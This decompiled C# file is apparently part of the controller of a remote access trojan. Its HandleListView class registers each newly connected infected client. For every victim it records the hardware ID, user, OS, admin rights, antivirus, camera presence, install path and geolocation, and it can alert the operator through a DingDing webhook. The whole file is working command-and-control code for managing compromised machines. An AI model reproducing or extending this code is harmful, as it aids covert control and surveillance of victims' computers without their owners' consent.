// Server.Handle_Packet.HandleListView
using System;
using System.Drawing;
using System.Media;
using System.Windows.Forms;
using IP2Region;
using Server;
using Server.Connection;
using Server.Handle_Packet;
using Server.Helper;
using Server.MessagePack;
using Server.Properties;

public class HandleListView
{
	public void AddToListview(Clients client, MsgPack unpack_msgpack)
	{
		try
		{
			lock (Server.Settings.LockBlocked)
			{
				try
				{
					if (Server.Settings.Blocked.Count > 0)
					{
						if (Server.Settings.Blocked.Contains(unpack_msgpack.ForcePathObject("HWID").AsString))
						{
							client.Disconnected();
							return;
						}
						if (Server.Settings.Blocked.Contains(client.Ip))
						{
							client.Disconnected();
							return;
						}
					}
				}
				catch
				{
				}
			}
			client.Admin = false;
			if (unpack_msgpack.ForcePathObject("Admin").AsString.ToLower() != "user")
			{
				client.Admin = true;
			}
			client.LV = new ListViewItem
			{
				Tag = client,
				Text = $"{client.Ip}:{client.TcpClient.LocalEndPoint.ToString().Split(':')[1]}"
			};
			string text = "";
			try
			{
				if (TimeZoneInfo.Local.Id == "China Standard Time")
				{
					using (DbSearcher dbSearcher = new DbSearcher(Environment.CurrentDirectory + "\\bin\\ip2region.db"))
					{
						string region = dbSearcher.MemorySearch(client.TcpClient.RemoteEndPoint.ToString().Split(':')[0]).Region;
						for (int i = 0; i < 5; i++)
						{
							if (i != 1 && (region.Split('|')[i] != "" || region.Split('|')[i] != " "))
							{
								text = text + region.Split('|')[i] + " ";
							}
						}
					}
					client.LV.SubItems.Add(text);
				}
				else
				{
					string[] array = Program.form1.cGeoMain.GetIpInf(client.TcpClient.RemoteEndPoint.ToString().Split(':')[0]).Split(':');
					client.LV.SubItems.Add(array[1]);
				}
			}
			catch
			{
				client.LV.SubItems.Add("Unknown");
			}
			client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Group").AsString);
			client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("HWID").AsString);
			client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("User").AsString);
			client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Camera").AsString);
			client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("OS").AsString);
			client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Version").AsString);
			try
			{
				client.LV.SubItems.Add(Convert.ToDateTime(unpack_msgpack.ForcePathObject("Install_ed").AsString).ToLocalTime().ToString());
			}
			catch
			{
				try
				{
					client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Install_ed").AsString);
				}
				catch
				{
					client.LV.SubItems.Add("??");
				}
			}
			client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Admin").AsString);
			client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Anti_virus").AsString);
			client.LV.SubItems.Add("0000 MS");
			client.LV.SubItems.Add("...");
			client.LV.ToolTipText = "[Path] " + unpack_msgpack.ForcePathObject("Path").AsString + Environment.NewLine;
			ListViewItem lV = client.LV;
			lV.ToolTipText = lV.ToolTipText + "[Paste_bin] " + unpack_msgpack.ForcePathObject("Paste_bin").AsString;
			client.ID = unpack_msgpack.ForcePathObject("HWID").AsString;
			client.LV.UseItemStyleForSubItems = false;
			client.LastPing = DateTime.Now;
			Program.form1.Invoke((MethodInvoker)delegate
			{
				lock (Server.Settings.LockListviewClients)
				{
					Program.form1.listView1.Items.Add(client.LV);
					Program.form1.listView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
					Program.form1.lv_act.Width = 500;
				}
				if (Server.Properties.Settings.Default.Notification)
				{
					Program.form1.notifyIcon1.BalloonTipText = "Connected \n" + client.Ip + " : " + client.TcpClient.LocalEndPoint.ToString().Split(':')[1];
					Program.form1.notifyIcon1.ShowBalloonTip(100);
					if (Server.Properties.Settings.Default.DingDing && Server.Properties.Settings.Default.WebHook != null && Server.Properties.Settings.Default.Secret != null)
					{
						try
						{
							string content = "Client " + client.Ip + " connected\nGroup:" + unpack_msgpack.ForcePathObject("Group").AsString + "\nUser:" + unpack_msgpack.ForcePathObject("User").AsString + "\nOS:" + unpack_msgpack.ForcePathObject("OS").AsString + "\nUser:" + unpack_msgpack.ForcePathObject("Admin").AsString;
							DingDing.Send(Server.Properties.Settings.Default.WebHook, Server.Properties.Settings.Default.Secret, content);
						}
						catch (Exception ex)
						{
							MessageBox.Show(ex.Message);
						}
					}
				}
				new HandleLogs().Addmsg("Client " + client.Ip + " connected", Color.Green);
				if (TimeZoneInfo.Local.Id == "China Standard Time" && Server.Properties.Settings.Default.Notification)
				{
					SoundPlayer soundPlayer = new SoundPlayer(Resources.online);
					soundPlayer.Load();
					soundPlayer.Play();
				}
			});
		}
		catch
		{
		}
	}

	public void Received(Clients client)
	{
		try
		{
			lock (Server.Settings.LockListviewClients)
			{
				if (client.LV != null)
				{
					client.LV.ForeColor = Color.Empty;
				}
			}
		}
		catch
		{
		}
	}
}
